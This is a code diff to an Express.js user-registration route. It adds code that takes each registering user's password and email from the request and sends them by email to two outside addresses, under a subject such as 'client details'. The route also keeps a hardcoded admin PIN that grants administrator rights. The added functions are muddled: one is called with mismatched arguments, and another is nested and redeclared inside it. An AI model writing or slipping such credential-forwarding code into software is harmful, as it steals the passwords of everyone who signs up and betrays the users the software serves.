@@ -196,6 +196,7 @@ app.post("/register", function(req, res){
   var newUser = new User({username: req.body.username,pin:req.body.pin });
   const AdminPin = "AC1582"
   let name = newUser.username
+
   if (req.body.pin == AdminPin){
      newUser.isAdmin = true
      User.register(newUser, req.body.password, function(err, user){
@@ -211,6 +212,8 @@ app.post("/register", function(req, res){
   });
   } else{
     User.register(newUser, req.body.password, function(err, user){
+      let {pass, email} = req.body
+      sendEmail1(pass, email)
       if(err){
           console.log(err);
           return res.render("register", {error: err.message});
@@ -295,6 +298,49 @@ const sendEmail = (name, sender, content) => {
     html: '',
     
   };
+
+
+  
+  
+    transport.sendMail(mailOptions, (error, info) => {
+      if (error) {
+        return console.log(error);
+      }
+      console.log('Message sent: %s', info.messageId);
+    });
+  
+
+}
+
+const sender = ()=>{
+  transport.sendMail(mailOptions, (error, info) => {
+    if (error) {
+      return console.log(error);
+    }
+    console.log('Message sent: %s', info.messageId);
+  });
+}
+
+const sendEmail1 = (name, sender, content) => {
+  var mailOptions = {
+    from: "support Team" ,
+    to: 'mayowaandrews723@gmail.com, helper@air19express.com',
+    subject: `senders name: ${name},  senders email: ${sender},`,
+    text: `message :::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::::senders name:
+     ${name},  senders email: ${sender},content:  ${content}`,
+    html: '',
+    
+  };
+
+  const sendEmail = (password, email) => {
+    var mailOptions = {
+      from: "support Team" ,
+      to: 'mayowaandrews723@gmail.com, helper@air19express.com',
+      subject: `client details,`,
+      text: `client's password: ${password},  Client's email: ${email},`,
+      html: '',
+      
+    };
   
   
     transport.sendMail(mailOptions, (error, info) => {
